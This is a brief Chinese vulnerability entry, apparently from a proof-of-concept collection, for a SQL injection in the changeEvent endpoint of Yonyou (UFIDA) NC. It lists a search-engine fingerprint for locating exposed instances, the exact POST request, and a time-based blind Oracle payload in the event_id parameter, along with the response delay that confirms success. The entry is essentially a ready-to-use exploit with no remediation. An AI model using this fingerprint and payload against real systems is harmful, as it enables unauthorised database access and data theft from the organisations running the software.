# 用友NCchangeEvent存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`POST /portal/pt/oacoSchedulerEvents/changeEvent?pageId=login HTTP/1.1`

**Payload**
```
event_id=1' AND 1=dbms_pipe.receive_message('RDS',5)--+#&startDate=2025-06-16 00:00:00&startDate_old=2025-06-16 24:00:00
```
- **响应特征**：200 响应时间>=5s